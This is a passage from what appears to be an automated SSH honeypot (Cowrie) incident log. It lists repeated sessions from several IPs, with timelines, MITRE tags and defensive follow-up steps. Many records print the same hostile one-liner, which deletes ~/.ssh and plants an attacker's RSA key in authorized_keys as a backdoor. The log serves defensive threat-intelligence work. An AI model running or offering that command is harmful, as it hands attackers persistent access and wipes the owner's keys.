| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 22:00:52` | `cowrie.session.connect` |
| `2026-04-12 22:00:52` | `cowrie.client.version` |
| `2026-04-12 22:00:52` | `cowrie.client.kex` |
| `2026-04-12 22:00:53` | `cowrie.login.success` |
| `2026-04-12 22:00:53` | `cowrie.session.params` |
| `2026-04-12 22:00:53` | `cowrie.command.input` |
| `2026-04-12 22:00:53` | `cowrie.command.failed` |
| `2026-04-12 22:00:53` | `cowrie.log.closed` |
| `2026-04-12 22:00:54` | `cowrie.session.params` |
| `2026-04-12 22:00:54` | `cowrie.command.input` |
| `2026-04-12 22:00:54` | `cowrie.session.file_download` |
| `2026-04-12 22:00:54` | `cowrie.log.closed` |
| `2026-04-12 22:00:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.149[.]130` to AbuseIPDB if not already reported
- [ ] Block `102.210.149[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad89b31eca96

| Field | Detail |
|---|---|
| **Source IP** | `102.210.149[.]130` |
| **First Seen** | 2026-04-12 22:00 |
| **Last Seen** | 2026-04-12 22:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 22:00:56` | `cowrie.session.connect` |
| `2026-04-12 22:00:56` | `cowrie.client.version` |
| `2026-04-12 22:00:56` | `cowrie.client.kex` |
| `2026-04-12 22:00:57` | `cowrie.login.success` |
| `2026-04-12 22:00:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.149[.]130` to AbuseIPDB if not already reported
- [ ] Block `102.210.149[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09cca14eda1b

| Field | Detail |
|---|---|
| **Source IP** | `102.210.149[.]130` |
| **First Seen** | 2026-04-12 22:02 |
| **Last Seen** | 2026-04-12 22:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 22:02:43` | `cowrie.session.connect` |
| `2026-04-12 22:02:43` | `cowrie.client.version` |
| `2026-04-12 22:02:43` | `cowrie.client.kex` |
| `2026-04-12 22:02:44` | `cowrie.login.success` |
| `2026-04-12 22:02:44` | `cowrie.session.params` |
| `2026-04-12 22:02:44` | `cowrie.command.input` |
| `2026-04-12 22:02:44` | `cowrie.command.failed` |
| `2026-04-12 22:02:44` | `cowrie.log.closed` |
| `2026-04-12 22:02:45` | `cowrie.session.params` |
| `2026-04-12 22:02:45` | `cowrie.command.input` |
| `2026-04-12 22:02:45` | `cowrie.session.file_download` |
| `2026-04-12 22:02:45` | `cowrie.log.closed` |
| `2026-04-12 22:02:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.149[.]130` to AbuseIPDB if not already reported
- [ ] Block `102.210.149[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cc259a79675

| Field | Detail |
|---|---|
| **Source IP** | `102.210.149[.]130` |
| **First Seen** | 2026-04-12 22:02 |
| **Last Seen** | 2026-04-12 22:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 22:02:47` | `cowrie.session.connect` |
| `2026-04-12 22:02:47` | `cowrie.client.version` |
| `2026-04-12 22:02:47` | `cowrie.client.kex` |
| `2026-04-12 22:02:48` | `cowrie.login.success` |
| `2026-04-12 22:02:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.149[.]130` to AbuseIPDB if not already reported
- [ ] Block `102.210.149[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-885ba8ee0acc

| Field | Detail |
|---|---|
| **Source IP** | `102.210.149[.]130` |
| **First Seen** | 2026-04-12 22:06 |
| **Last Seen** | 2026-04-12 22:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 22:06:25` | `cowrie.session.connect` |
| `2026-04-12 22:06:25` | `cowrie.client.version` |
| `2026-04-12 22:06:25` | `cowrie.client.kex` |
| `2026-04-12 22:06:26` | `cowrie.login.success` |
| `2026-04-12 22:06:26` | `cowrie.session.params` |
| `2026-04-12 22:06:26` | `cowrie.command.input` |
| `2026-04-12 22:06:26` | `cowrie.command.failed` |
| `2026-04-12 22:06:27` | `cowrie.log.closed` |
| `2026-04-12 22:06:27` | `cowrie.session.params` |
| `2026-04-12 22:06:27` | `cowrie.command.input` |
| `2026-04-12 22:06:27` | `cowrie.session.file_download` |
| `2026-04-12 22:06:27` | `cowrie.log.closed` |
| `2026-04-12 22:06:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.149[.]130` to AbuseIPDB if not already reported
- [ ] Block `102.210.149[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5357f259e7c2

| Field | Detail |
|---|---|
| **Source IP** | `102.210.149[.]130` |
| **First Seen** | 2026-04-12 22:06 |
| **Last Seen** | 2026-04-12 22:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 22:06:30` | `cowrie.session.connect` |
| `2026-04-12 22:06:30` | `cowrie.client.version` |
| `2026-04-12 22:06:30` | `cowrie.client.kex` |
| `2026-04-12 22:06:31` | `cowrie.login.success` |
| `2026-04-12 22:06:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.149[.]130` to AbuseIPDB if not already reported
- [ ] Block `102.210.149[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4056c3ade9a2

| Field | Detail |
|---|---|
| **Source IP** | `102.210.149[.]130` |
| **First Seen** | 2026-04-12 22:09 |
| **Last Seen** | 2026-04-12 22:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 22:09:57` | `cowrie.session.connect` |
| `2026-04-12 22:09:57` | `cowrie.client.version` |
| `2026-04-12 22:09:57` | `cowrie.client.kex` |
| `2026-04-12 22:09:58` | `cowrie.login.success` |
| `2026-04-12 22:09:58` | `cowrie.session.params` |
| `2026-04-12 22:09:58` | `cowrie.command.input` |
| `2026-04-12 22:09:58` | `cowrie.command.failed` |
| `2026-04-12 22:09:59` | `cowrie.log.closed` |
| `2026-04-12 22:09:59` | `cowrie.session.params` |
| `2026-04-12 22:09:59` | `cowrie.command.input` |
| `2026-04-12 22:09:59` | `cowrie.session.file_download` |
| `2026-04-12 22:09:59` | `cowrie.log.closed` |
| `2026-04-12 22:10:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.149[.]130` to AbuseIPDB if not already reported
- [ ] Block `102.210.149[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c868e003b99

| Field | Detail |
|---|---|
| **Source IP** | `102.210.149[.]130` |
| **First Seen** | 2026-04-12 22:10 |
| **Last Seen** | 2026-04-12 22:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 22:10:02` | `cowrie.session.connect` |
| `2026-04-12 22:10:02` | `cowrie.client.version` |
| `2026-04-12 22:10:02` | `cowrie.client.kex` |
| `2026-04-12 22:10:02` | `cowrie.login.success` |
| `2026-04-12 22:10:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.149[.]130` to AbuseIPDB if not already reported
- [ ] Block `102.210.149[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd0776c2f651

| Field | Detail |
|---|---|
| **Source IP** | `102.210.149[.]130` |
| **First Seen** | 2026-04-12 22:15 |
| **Last Seen** | 2026-04-12 22:15 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 22:15:30` | `cowrie.session.connect` |
| `2026-04-12 22:15:30` | `cowrie.client.version` |
| `2026-04-12 22:15:30` | `cowrie.client.kex` |
| `2026-04-12 22:15:30` | `cowrie.login.success` |
| `2026-04-12 22:15:31` | `cowrie.session.params` |
| `2026-04-12 22:15:31` | `cowrie.command.input` |
| `2026-04-12 22:15:31` | `cowrie.command.failed` |
| `2026-04-12 22:15:31` | `cowrie.log.closed` |
| `2026-04-12 22:15:31` | `cowrie.session.params` |
| `2026-04-12 22:15:31` | `cowrie.command.input` |
| `2026-04-12 22:15:32` | `cowrie.session.file_download` |
| `2026-04-12 22:15:32` | `cowrie.log.closed` |
| `2026-04-12 22:15:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.149[.]130` to AbuseIPDB if not already reported
- [ ] Block `102.210.149[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca121212bbbd

| Field | Detail |
|---|---|
| **Source IP** | `102.210.149[.]130` |
| **First Seen** | 2026-04-12 22:15 |
| **Last Seen** | 2026-04-12 22:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 22:15:34` | `cowrie.session.connect` |
| `2026-04-12 22:15:34` | `cowrie.client.version` |
| `2026-04-12 22:15:34` | `cowrie.client.kex` |
| `2026-04-12 22:15:35` | `cowrie.login.success` |
| `2026-04-12 22:15:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.149[.]130` to AbuseIPDB if not already reported
- [ ] Block `102.210.149[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6ee570d6a35

| Field | Detail |
|---|---|
| **Source IP** | `152.32.186[.]46` |
| **First Seen** | 2026-04-12 22:15 |
| **Last Seen** | 2026-04-12 22:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 22:15:48` | `cowrie.session.connect` |
| `2026-04-12 22:15:48` | `cowrie.client.version` |
| `2026-04-12 22:15:48` | `cowrie.client.kex` |
| `2026-04-12 22:15:49` | `cowrie.login.success` |
| `2026-04-12 22:15:49` | `cowrie.session.params` |
| `2026-04-12 22:15:49` | `cowrie.command.input` |
| `2026-04-12 22:15:49` | `cowrie.command.failed` |
| `2026-04-12 22:15:49` | `cowrie.log.closed` |
| `2026-04-12 22:15:49` | `cowrie.session.params` |
| `2026-04-12 22:15:49` | `cowrie.command.input` |
| `2026-04-12 22:15:49` | `cowrie.session.file_download` |
| `2026-04-12 22:15:49` | `cowrie.log.closed` |
| `2026-04-12 22:15:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.186[.]46` to AbuseIPDB if not already reported
- [ ] Block `152.32.186[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25ae79a35338

| Field | Detail |
|---|---|
| **Source IP** | `152.32.186[.]46` |
| **First Seen** | 2026-04-12 22:15 |
| **Last Seen** | 2026-04-12 22:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 22:15:51` | `cowrie.session.connect` |
| `2026-04-12 22:15:51` | `cowrie.client.version` |
| `2026-04-12 22:15:51` | `cowrie.client.kex` |
| `2026-04-12 22:15:52` | `cowrie.login.success` |
| `2026-04-12 22:15:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.186[.]46` to AbuseIPDB if not already reported
- [ ] Block `152.32.186[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-259b713c5451

| Field | Detail |
|---|---|
| **Source IP** | `152.32.186[.]46` |
| **First Seen** | 2026-04-12 22:17 |
| **Last Seen** | 2026-04-12 22:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 22:17:29` | `cowrie.session.connect` |
| `2026-04-12 22:17:29` | `cowrie.client.version` |
| `2026-04-12 22:17:29` | `cowrie.client.kex` |
| `2026-04-12 22:17:29` | `cowrie.login.success` |
| `2026-04-12 22:17:29` | `cowrie.session.params` |
| `2026-04-12 22:17:29` | `cowrie.command.input` |
| `2026-04-12 22:17:29` | `cowrie.command.failed` |
| `2026-04-12 22:17:30` | `cowrie.log.closed` |
| `2026-04-12 22:17:30` | `cowrie.session.params` |
| `2026-04-12 22:17:30` | `cowrie.command.input` |
| `2026-04-12 22:17:30` | `cowrie.session.file_download` |
| `2026-04-12 22:17:30` | `cowrie.log.closed` |
| `2026-04-12 22:17:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.186[.]46` to AbuseIPDB if not already reported
- [ ] Block `152.32.186[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5afc89d95cb

| Field | Detail |
|---|---|
| **Source IP** | `152.32.186[.]46` |
| **First Seen** | 2026-04-12 22:17 |
| **Last Seen** | 2026-04-12 22:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 22:17:32` | `cowrie.session.connect` |
| `2026-04-12 22:17:32` | `cowrie.client.version` |
| `2026-04-12 22:17:32` | `cowrie.client.kex` |
| `2026-04-12 22:17:32` | `cowrie.login.success` |
| `2026-04-12 22:17:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.186[.]46` to AbuseIPDB if not already reported
- [ ] Block `152.32.186[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e49d419921a6

| Field | Detail |
|---|---|
| **Source IP** | `139.99.133[.]77` |
| **First Seen** | 2026-04-12 22:28 |
| **Last Seen** | 2026-04-12 22:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 22:28:22` | `cowrie.session.connect` |
| `2026-04-12 22:28:22` | `cowrie.client.version` |
| `2026-04-12 22:28:22` | `cowrie.client.kex` |
| `2026-04-12 22:28:23` | `cowrie.login.success` |
| `2026-04-12 22:28:23` | `cowrie.session.params` |
| `2026-04-12 22:28:23` | `cowrie.command.input` |
| `2026-04-12 22:28:23` | `cowrie.command.failed` |
| `2026-04-12 22:28:23` | `cowrie.log.closed` |
| `2026-04-12 22:28:24` | `cowrie.session.params` |
| `2026-04-12 22:28:24` | `cowrie.command.input` |
| `2026-04-12 22:28:24` | `cowrie.session.file_download` |
| `2026-04-12 22:28:24` | `cowrie.log.closed` |
| `2026-04-12 22:28:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.99.133[.]77` to AbuseIPDB if not already reported
- [ ] Block `139.99.133[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f90bbcbfb2c

| Field | Detail |
|---|---|
| **Source IP** | `139.99.133[.]77` |
| **First Seen** | 2026-04-12 22:28 |
| **Last Seen** | 2026-04-12 22:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 22:28:26` | `cowrie.session.connect` |
| `2026-04-12 22:28:26` | `cowrie.client.version` |
| `2026-04-12 22:28:26` | `cowrie.client.kex` |
| `2026-04-12 22:28:27` | `cowrie.login.success` |
| `2026-04-12 22:28:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.99.133[.]77` to AbuseIPDB if not already reported
- [ ] Block `139.99.133[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6554cfff414a

| Field | Detail |
|---|---|
| **Source IP** | `39.115.183[.]206` |
| **First Seen** | 2026-04-12 22:29 |
| **Last Seen** | 2026-04-12 22:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 22:29:03` | `cowrie.session.connect` |
| `2026-04-12 22:29:03` | `cowrie.client.version` |
| `2026-04-12 22:29:03` | `cowrie.client.kex` |
| `2026-04-12 22:29:04` | `cowrie.login.success` |
| `2026-04-12 22:29:04` | `cowrie.session.params` |
| `2026-04-12 22:29:04` | `cowrie.command.input` |
